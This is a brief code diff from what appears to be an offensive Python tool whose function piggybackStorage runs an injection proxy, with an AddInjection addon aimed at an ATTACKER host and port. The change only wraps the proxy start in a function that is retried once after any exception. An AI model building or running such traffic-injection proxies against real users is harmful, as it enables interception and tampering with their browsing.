@@ -72,8 +72,15 @@ def piggybackStorage(ip:str,port:int,fp:str)->None:
     prox.addons.add(AddInjection(prox,input,ATTACKER,ATTACKER_PORT))
     browser.set()
     # start proxying!
-    print("[!] Starting Proxy")
-    prox.run()
-    print("[!] Proxy Stopped")
-    browser.release()
+
+    def startprox():
+        print("[!] Starting Proxy")
+        prox.run()
+        print("[!] Proxy Stopped")
+        browser.release()
+
+    try:
+        startprox()
+    except:
+        startprox()
         
